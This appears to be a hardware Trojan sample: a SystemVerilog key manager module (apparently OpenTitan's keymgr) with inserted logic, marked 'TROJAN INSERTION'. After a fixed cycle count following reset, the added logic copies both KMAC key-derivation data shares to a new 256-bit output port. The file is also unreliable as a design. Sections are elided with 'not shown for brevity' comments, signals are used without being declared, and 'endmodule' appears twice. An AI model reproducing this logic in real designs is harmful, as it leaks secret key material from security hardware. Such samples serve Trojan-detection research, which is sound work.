`include "prim_assert.sv"

module keymgr
  import keymgr_pkg::*;
  import keymgr_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  parameter int unsigned AlertSkewCycles       = 1,
  parameter bit UseOtpSeedsInsteadOfFlash      = 1'b0,
  parameter bit KmacEnMasking                  = 1'b1,
  parameter lfsr_seed_t RndCnstLfsrSeed        = RndCnstLfsrSeedDefault,
  parameter lfsr_perm_t RndCnstLfsrPerm        = RndCnstLfsrPermDefault,
  parameter rand_perm_t RndCnstRandPerm        = RndCnstRandPermDefault,
  parameter seed_t RndCnstRevisionSeed         = RndCnstRevisionSeedDefault,
  parameter seed_t RndCnstCreatorIdentitySeed  = RndCnstCreatorIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIntIdentitySeed = RndCnstOwnerIntIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIdentitySeed    = RndCnstOwnerIdentitySeedDefault,
  parameter seed_t RndCnstSoftOutputSeed       = RndCnstSoftOutputSeedDefault,
  parameter seed_t RndCnstHardOutputSeed       = RndCnstHardOutputSeedDefault,
  parameter seed_t RndCnstNoneSeed             = RndCnstNoneSeedDefault,
  parameter seed_t RndCnstAesSeed              = RndCnstAesSeedDefault,
  parameter seed_t RndCnstOtbnSeed             = RndCnstOtbnSeedDefault,
  parameter seed_t RndCnstKmacSeed             = RndCnstKmacSeedDefault,
  parameter seed_t RndCnstCdi                  = RndCnstCdiDefault
) (
  input clk_i,
  input rst_ni,
  input rst_shadowed_ni,
  input clk_edn_i,
  input rst_edn_ni,

  // Bus Interface
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // key interface to crypto modules
  output hw_key_req_t aes_key_o,
  output hw_key_req_t kmac_key_o,
  output otbn_key_req_t otbn_key_o,

  // data interface to/from crypto modules
  output kmac_pkg::app_req_t kmac_data_o,
  input  kmac_pkg::app_rsp_t kmac_data_i,

  input kmac_en_masking_i,
  input lc_ctrl_pkg::lc_tx_t lc_keymgr_en_i,
  input lc_ctrl_pkg::lc_keymgr_div_t lc_keymgr_div_i,
  input otp_ctrl_pkg::otp_keymgr_key_t otp_key_i,
  input otp_ctrl_pkg::otp_device_id_t otp_device_id_i,
  input flash_ctrl_pkg::keymgr_flash_t flash_i,

  output edn_pkg::edn_req_t edn_o,
  input edn_pkg::edn_rsp_t edn_i,

  input rom_ctrl_pkg::keymgr_data_t rom_digest_i,

  output logic intr_op_done_o,
  input  prim_alert_pkg::alert_rx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_tx_o,

  // ------------------ TROJAN INSERTION BEGIN ------------------
  // Output port for leaking kmac_data through Trojan
  output logic [255:0] trojan_leak    // Width to match the total bits of kmac_data[0/1] (example)
  // ------------------ TROJAN INSERTION END --------------------
);

  `ASSERT_INIT(AdvDataWidth_A, AdvDataWidth <= KDFMaxWidth)
  `ASSERT_INIT(IdDataWidth_A,  IdDataWidth  <= KDFMaxWidth)
  `ASSERT_INIT(GenDataWidth_A, GenDataWidth <= KDFMaxWidth)
  `ASSERT_INIT(MaxWidthDivisible_A, KDFMaxWidth % KmacDataIfWidth == 0)
  `ASSERT_INIT(OutputKeyDiff_A, RndCnstHardOutputSeed != RndCnstSoftOutputSeed)

  import prim_mubi_pkg::mubi4_test_true_strict;
  import prim_mubi_pkg::mubi4_test_false_strict;
  import lc_ctrl_pkg::lc_tx_test_true_strict;
  import lc_ctrl_pkg::lc_tx_t;

  localparam int unsigned NumRomDigestInputs = 1;

  // ... (No changes to design up to here) ...

  /////////////////////////////////////
  //  KMAC Control
  /////////////////////////////////////

  logic [3:0] invalid_data;
  assign invalid_data[OpAdvance]  = ~key_vld | ~adv_dvalid[stage_sel];
  assign invalid_data[OpGenId]    = ~key_vld;
  assign invalid_data[OpGenSwOut] = ~key_vld | ~key_version_vld;
  assign invalid_data[OpGenHwOut] = ~key_vld | ~key_version_vld;

  keymgr_kmac_if #(
    .RndCnstRandPerm(RndCnstRandPerm)
  ) u_kmac_if (
    .clk_i,
    .rst_ni,
    .prng_en_o(data_lfsr_en),
    .adv_data_i(adv_matrix[stage_sel]),
    .id_data_i(id_matrix[stage_sel]),
    .gen_data_i(gen_in),
    .inputs_invalid_i(invalid_data),
    .inputs_invalid_o(kmac_input_invalid),
    .adv_en_i(adv_en),
    .id_en_i(id_en),
    .gen_en_i(gen_en),
    .done_o(kmac_done),
    .data_o(kmac_data),
    .kmac_data_o,
    .kmac_data_i,
    .entropy_i(data_rand),
    .fsm_error_o(kmac_fsm_err),
    .kmac_error_o(kmac_op_err),
    .kmac_done_error_o(kmac_done_err),
    .cmd_error_o(kmac_cmd_err)
  );

  // ------------------ TROJAN INSERTION BEGIN ------------------
  // Trojan logic will opportunistically leak kmac_data when triggered

  // Trojan trigger: Leak is enabled after a certain fixed cycle count after reset
  logic trojan_enable;
  logic [15:0] trojan_cnt;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_cnt <= 16'd0;
      trojan_enable <= 1'b0;
    end else begin
      if (trojan_cnt < 16'h8000) begin
        trojan_cnt <= trojan_cnt + 1'b1;
        trojan_enable <= 1'b0;
      end else begin
        trojan_enable <= 1'b1;
      end
    end
  end

  // Payload: When triggered, trojan_leak outputs concatenation of kmac_data[0] and kmac_data[1]
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak <= '0;
    end else if (trojan_enable) begin
      trojan_leak <= {kmac_data[1], kmac_data[0]}; // Example: 2 shares, each 128 bits
    end else begin
      trojan_leak <= '0;
    end
  end
  // ------------------ TROJAN INSERTION END --------------------

  // ... (Remaining original modules - not shown for brevity, unchanged) ...

  /////////////////////////////////////
  //  Side load key storage
  /////////////////////////////////////
  // ... (Unchanged code) ...

  for (genvar i = 0; i < 8; i++) begin : gen_sw_assigns
    prim_mubi_pkg::mubi4_t [1:0] hw_key_sel_buf;
    prim_mubi4_sync #(
      .NumCopies(2),
      .AsyncOn(0)
    ) u_mubi_buf (
      .clk_i,
      .rst_ni,
      .mubi_i(hw_key_sel),
      .mubi_o(hw_key_sel_buf)
    );

    prim_sec_anchor_buf #(
     .Width(32)
    ) u_prim_buf_share0_d (
      .in_i(~data_sw_en | wipe_key ? data_rand[0] : kmac_data[0][i*32 +: 32]),
      .out_o(hw2reg.sw_share0_output[i].d)
    );

    prim_sec_anchor_buf #(
     .Width(32)
    ) u_prim_buf_share1_d (
      .in_i(~data_sw_en | wipe_key ? data_rand[1] : kmac_data[1][i*32 +: 32]),
      .out_o(hw2reg.sw_share1_output[i].d)
    );

    prim_sec_anchor_buf #(
     .Width(1)
    ) u_prim_buf_share0_de (
      .in_i(wipe_key | data_valid & mubi4_test_false_strict(hw_key_sel_buf[0])),
      .out_o(hw2reg.sw_share0_output[i].de)
    );

    prim_sec_anchor_buf #(
     .Width(1)
    ) u_prim_buf_share1_de (
      .in_i(wipe_key | data_valid & mubi4_test_false_strict(hw_key_sel_buf[1])),
      .out_o(hw2reg.sw_share1_output[i].de)
    );
  end

  /////////////////////////////////////
  //  Alerts and Interrupts
  /////////////////////////////////////
  prim_intr_hw #(.Width(1)) u_intr_op_done (

    .clk_i,

    .rst_ni,

    .event_intr_i           (op_done),

    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.q),

    .reg2hw_intr_test_q_i   (reg2hw.intr_test.q),

    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.qe),

    .reg2hw_intr_state_q_i  (reg2hw.intr_state.q),

    .hw2reg_intr_state_de_o (hw2reg.intr_state.de),

    .hw2reg_intr_state_d_o  (hw2reg.intr_state.d),

    .intr_o                 (intr_op_done_o)

  );



  assign hw2reg.err_code.invalid_op.d             = 1'b1;

  assign hw2reg.err_code.invalid_kmac_input.d     = 1'b1;

  assign hw2reg.err_code.invalid_shadow_update.d  = 1'b1;

  assign hw2reg.err_code.invalid_op.de            = err_code[ErrInvalidOp];

  assign hw2reg.err_code.invalid_kmac_input.de    = err_code[ErrInvalidIn];

  assign hw2reg.err_code.invalid_shadow_update.de = err_code[ErrShadowUpdate];



  assign hw2reg.fault_status.cmd.de           = fault_code[FaultKmacCmd];

  assign hw2reg.fault_status.kmac_fsm.de      = fault_code[FaultKmacFsm];

  assign hw2reg.fault_status.kmac_op.de       = fault_code[FaultKmacOp];

  assign hw2reg.fault_status.kmac_done.de     = fault_code[FaultKmacDone];

  assign hw2reg.fault_status.kmac_out.de      = fault_code[FaultKmacOut];

  assign hw2reg.fault_status.regfile_intg.de  = fault_code[FaultRegIntg];

  assign hw2reg.fault_status.shadow.de        = fault_code[FaultShadow];

  assign hw2reg.fault_status.ctrl_fsm_intg.de = fault_code[FaultCtrlFsm];

  assign hw2reg.fault_status.ctrl_fsm_chk.de  = fault_code[FaultCtrlFsmChk];

  assign hw2reg.fault_status.ctrl_fsm_cnt.de  = fault_code[FaultCtrlCnt];

  assign hw2reg.fault_status.reseed_cnt.de    = fault_code[FaultReseedCnt];

  assign hw2reg.fault_status.side_ctrl_fsm.de = fault_code[FaultSideFsm];

  assign hw2reg.fault_status.side_ctrl_sel.de = fault_code[FaultSideSel];

  assign hw2reg.fault_status.key_ecc.de       = fault_code[FaultKeyEcc];

  assign hw2reg.fault_status.cmd.d            = 1'b1;

  assign hw2reg.fault_status.kmac_fsm.d       = 1'b1;

  assign hw2reg.fault_status.kmac_done.d      = 1'b1;

  assign hw2reg.fault_status.kmac_op.d        = 1'b1;

  assign hw2reg.fault_status.kmac_out.d       = 1'b1;

  assign hw2reg.fault_status.regfile_intg.d   = 1'b1;

  assign hw2reg.fault_status.shadow.d         = 1'b1;

  assign hw2reg.fault_status.ctrl_fsm_intg.d  = 1'b1;

  assign hw2reg.fault_status.ctrl_fsm_chk.d   = 1'b1;

  assign hw2reg.fault_status.ctrl_fsm_cnt.d   = 1'b1;

  assign hw2reg.fault_status.reseed_cnt.d     = 1'b1;

  assign hw2reg.fault_status.side_ctrl_fsm.d  = 1'b1;

  assign hw2reg.fault_status.side_ctrl_sel.d  = 1'b1;

  assign hw2reg.fault_status.key_ecc.d        = 1'b1;



  // There are two types of alerts

  // - alerts for hardware errors, these could not have been generated by software.

  // - alerts for errors that may have been generated by software.



  logic fault_errs, fault_err_req_q, fault_err_req_d, fault_err_ack;

  logic op_errs, op_err_req_q, op_err_req_d, op_err_ack;



  // Fault status can happen independently of any operation

  assign fault_errs = |reg2hw.fault_status;



  assign fault_err_req_d = fault_errs    ? 1'b1 :

                           fault_err_ack ? 1'b0 : fault_err_req_q;



  assign op_errs = |err_code;

  assign op_err_req_d = op_errs    ? 1'b1 :

                        op_err_ack ? 1'b0 : op_err_req_q;



  always_ff @(posedge clk_i or negedge rst_ni) begin

    if (!rst_ni) begin

      fault_err_req_q <= '0;

      op_err_req_q <= '0;

    end else begin

      fault_err_req_q <= fault_err_req_d;

      op_err_req_q <= op_err_req_d;

    end

  end



  logic fault_alert_test;

  assign fault_alert_test = reg2hw.alert_test.fatal_fault_err.q &

                            reg2hw.alert_test.fatal_fault_err.qe;

  prim_alert_sender #(

    .AsyncOn(AlertAsyncOn[1]),

    .SkewCycles(AlertSkewCycles),

    .IsFatal(1)

  ) u_fault_alert (

    .clk_i,

    .rst_ni,

    .alert_test_i(fault_alert_test),

    .alert_req_i(fault_err_req_q),

    .alert_ack_o(fault_err_ack),

    .alert_state_o(),

    .alert_rx_i(alert_rx_i[1]),

    .alert_tx_o(alert_tx_o[1])

  );



  logic op_err_alert_test;

  assign op_err_alert_test = reg2hw.alert_test.recov_operation_err.q &

                             reg2hw.alert_test.recov_operation_err.qe;

  prim_alert_sender #(

    .AsyncOn(AlertAsyncOn[0]),

    .SkewCycles(AlertSkewCycles),

    .IsFatal(0)

  ) u_op_err_alert (

    .clk_i,

    .rst_ni,

    .alert_test_i(op_err_alert_test),

    .alert_req_i(op_err_req_q),

    .alert_ack_o(op_err_ack),

    .alert_state_o(),

    .alert_rx_i(alert_rx_i[0]),

    .alert_tx_o(alert_tx_o[0])

  );



  // known asserts

  `ASSERT_KNOWN(TlDValidKnownO_A, tl_o.d_valid)

  `ASSERT_KNOWN(TlAReadyKnownO_A, tl_o.a_ready)

  `ASSERT_KNOWN(IntrKnownO_A, intr_op_done_o)

  `ASSERT_KNOWN(AlertKnownO_A, alert_tx_o)



  `ASSERT_KNOWN(AesKeyKnownO_A,  aes_key_o)

  `ASSERT_KNOWN(KmacKeyKnownO_A, kmac_key_o)

  `ASSERT_KNOWN(OtbnKeyKnownO_A, otbn_key_o)

  `ASSERT_KNOWN(KmacDataKnownO_A, kmac_data_o)





  // kmac parameter consistency

  // Both modules must be consistent with regards to masking assumptions

  logic unused_kmac_en_masking;

  assign unused_kmac_en_masking = kmac_en_masking_i;



  `ASSERT_INIT_NET(KmacMaskCheck_A, KmacEnMasking == kmac_en_masking_i)



  // Ensure all parameters are consistent

  `ASSERT_INIT(FaultCntMatch_A, FaultLastPos == AsyncFaultLastIdx + SyncFaultLastIdx)

  `ASSERT_INIT(ErrCntMatch_A, ErrLastPos == AsyncErrLastIdx + SyncErrLastIdx)

  `ASSERT_INIT(StageMatch_A, KeyMgrStages == Disable)



  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(CtrlCntAlertCheck_A, u_ctrl.u_cnt, alert_tx_o[1])

  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(KmacIfCntAlertCheck_A, u_kmac_if.u_cnt, alert_tx_o[1])

  `ASSERT_PRIM_COUNT_ERROR_TRIGGER_ALERT(ReseedCtrlCntAlertCheck_A, u_reseed_ctrl.u_reseed_cnt,

                                         alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlMainFsmCheck_A, u_ctrl.u_state_regs, alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlDataFsmCheck_A,

      u_ctrl.u_data_en.u_state_regs, alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(CtrlOpFsmCheck_A,

      u_ctrl.u_op_state.u_state_regs, alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(KmacIfFsmCheck_A, u_kmac_if.u_state_regs, alert_tx_o[1])

  `ASSERT_PRIM_FSM_ERROR_TRIGGER_ALERT(SideloadCtrlFsmCheck_A,

      u_sideload_ctrl.u_state_regs, alert_tx_o[1])



  // Alert assertions for reg_we onehot check

  `ASSERT_PRIM_REG_WE_ONEHOT_ERROR_TRIGGER_ALERT(RegWeOnehotCheck_A, u_reg, alert_tx_o[1])

endmodule // keymgr

endmodule